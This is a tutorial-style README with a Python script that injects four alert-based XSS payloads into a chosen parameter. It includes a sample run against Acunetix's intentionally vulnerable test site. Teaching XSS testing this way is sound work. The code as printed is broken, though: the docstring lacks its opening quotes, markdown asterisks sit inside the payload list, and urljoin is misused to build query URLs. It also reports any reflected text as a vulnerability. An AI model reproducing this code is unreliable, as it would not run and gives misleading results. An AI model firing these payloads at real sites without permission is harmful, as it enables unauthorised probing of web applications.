# Python Script to Test Cross-Site Scripting (XSS) Vulnerabilities

This Python script allows you to test for Cross-Site Scripting (XSS) vulnerabilities in a web application by injecting potential XSS payloads into a specified parameter. If the web application is vulnerable, it will execute the script, allowing malicious content to be injected and executed in the browser.


# How to Use the Script
**Steps:**

    **Enter the Target Web Application URL:**
        You need to input the URL of the target web application that you want to test. This should be a web page that accepts user input and may be susceptible to XSS attacks.

    Example: I will use the http://testphp.vulnweb.com/search.php?test=query URL, which is an intentionally vulnerable web application for testing (Accunetix vulnerable web application).

    **Specify the Parameter Name:**
        In the web application, identify which parameter you want to test for XSS vulnerabilities. This could be a query parameter or a form input field.

    To find the parameter name:
        Right-click on the input field you want to test (such as a search box).
        Select "Inspect" (or "Inspect Element") to open the browser’s developer tools.
        Locate the name attribute of the input field. This is the parameter you will be testing.

    Example: For the search input box on the test application, the parameter name is **searchFor.**

![Image](https://github.com/user-attachments/assets/fff13fc7-c44e-410f-bb74-dd590334ff86)



# Script Overview

The script tests various XSS payloads by injecting them into the specified parameter in the URL and checking for any response that would suggest the payload has been executed (e.g., by returning the injected script in the response).

#Here is the code

# Import the request library: request module allows you to send HTTP requests
import requests
from urllib.parse import urljoin

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    **"<img src='x' onerror='alert(\"XSS\")'>",**
    "<svg/onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>XSS</a>"
]

def test_xss(url, param=None, method='GET'):
 
    #Function to test for XSS vulnerability in a web application.
    
    Args:
    - url (str): The target URL of the web application.
    - param (str): Optional parameter to inject into (e.g., form field, URL parameter).
    - method (str): HTTP method (GET/POST).
    """
    # Test each payload
    for payload in xss_payloads:
        if method.upper() == 'GET':
            # Test by adding the payload in the URL (query parameters)
            test_url = urljoin(url, f"{param}={payload}")
            response = requests.get(test_url)
        elif method.upper() == 'POST':
            # Test by injecting the payload into a form field via POST request
            data = {param: payload}
            response = requests.post(url, data=data)
        else:
            print(f"Unsupported HTTP method: {method}")
            return

        # Check if the payload appears in the response (indicating XSS execution)
        if payload in response.text:
            print(f"[+] Potential XSS vulnerability found with payload: {payload}")
            print(f"    Response contains payload: {payload}")
            print(f"    Test URL: {response.url}")
        else:
            print(f"[-] No XSS vulnerability found with payload: {payload}")

# Example usage
if __name__ == "__main__":
    # Target web application URL
    target_url = input("Enter the URL of the web application to test: ").strip()

    # Specify the parameter name to inject into (e.g., 'username', 'search')
    param = input("Enter the parameter to inject into (e.g., 'username', 'search'): ").strip()

    # HTTP method to use for the test (GET or POST)
    method = input("Enter HTTP method (GET/POST): ").strip()

    # Run XSS test
    test_xss(target_url, param, method)


# Output:

(venv) aheaheeralaleralal@AHEERALALs-MacBook-Pro Python % /Users/aheaheeralaleralal/Desktop/Python/venv/bin/python /Users/aheaheeralaleralal/Desktop/Python/
xss.py
Enter the URL of the web application to test: http://testphp.vulnweb.com/search.php?test=query


Enter the parameter to inject into (e.g., 'username', 'search'): searchFor


Enter HTTP method (GET/POST):** POST**


[+] Potential XSS vulnerability found with payload: <script>alert('XSS')</script>

    Response contains payload: <script>alert('XSS')</script>
    
    Test URL: http://testphp.vulnweb.com/search.php?test=query

    
[+] Potential XSS vulnerability found with payload: <img src='x' onerror='alert("XSS")'>


    Response contains payload: <img src='x' onerror='alert("XSS")'>

    
    Test URL: http://testphp.vulnweb.com/search.php?test=query

    
[+] Potential XSS vulnerability found with payload: <svg/onload=alert('XSS')>


    Response contains payload: <svg/onload=alert('XSS')>

    
    Test URL: http://testphp.vulnweb.com/search.php?test=query

    
[+] Potential XSS vulnerability found with payload: <a href='javascript:alert(1)'>XSS</a>


    Response contains payload: <a href='javascript:alert(1)'>XSS</a>
    Test URL: http://testphp.vulnweb.com/search.php?test=query
